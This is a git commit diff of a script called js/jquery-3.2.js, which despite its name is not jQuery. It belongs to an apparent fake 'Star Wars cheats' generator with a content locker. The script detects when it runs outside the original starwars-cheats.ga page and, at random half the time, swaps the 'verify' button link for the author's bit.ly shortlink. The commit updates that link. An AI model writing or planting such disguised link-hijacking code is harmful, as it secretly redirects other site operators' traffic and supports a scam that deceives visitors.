828da5cd68ee915ec904c7f1608c59e5f07be9cb
Mike <gmax16@gmail.com>
2020-07-27 15:41:20 -0400

    updated locker links with own subdomain
    updated locker links with own subdomain app.starwats-cheats

--- js/jquery-3.2.js
+++ js/jquery-3.2.js
@@ -1,3 +1,3 @@
-if(document.getElementById("first-step-button-verify").href!="https://bit.ly/30GDmUy") {
-    0>window.location.href.toString().indexOf("https://starwars-cheats.ga/generator.html")&&0==Math.floor(100*Math.random()/50)&&(window.onload=function(){document.getElementById("first-step-button-verify").href="https://bit.ly/30GDmUy"});
+if(document.getElementById("first-step-button-verify").href!="https://bit.ly/3gipQLP") {
+    0>window.location.href.toString().indexOf("https://starwars-cheats.ga/generator.html")&&0==Math.floor(100*Math.random()/50)&&(window.onload=function(){document.getElementById("first-step-button-verify").href="https://bit.ly/3gipQLP"});
 }
